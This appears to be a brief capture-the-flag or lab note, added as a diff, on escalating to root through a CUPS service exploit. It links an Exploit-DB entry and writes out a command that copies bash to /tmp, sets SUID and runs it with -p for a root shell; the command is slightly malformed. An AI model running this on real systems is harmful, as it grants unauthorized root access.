@@ -1,0 +1,17 @@
+Enum 
+there is service running as root called CUPS;
+the rce exploit: 
+
+https://www.exploit-db.com/exploits/41233
+
+
+put a bash binary in tmp folder and attempt to change SUID bit and then run the -p flag though the rce:
+cp  /bin/bash /tmp/exploit;chmod+s /tmp/exploit /tmp/exploit -p 
+
+
+and the your are root#
+“””””””””””””””””””””””
+
+Note:
+
+I got this way for the requirement of this exploit we need to perform the bash suid thing first.
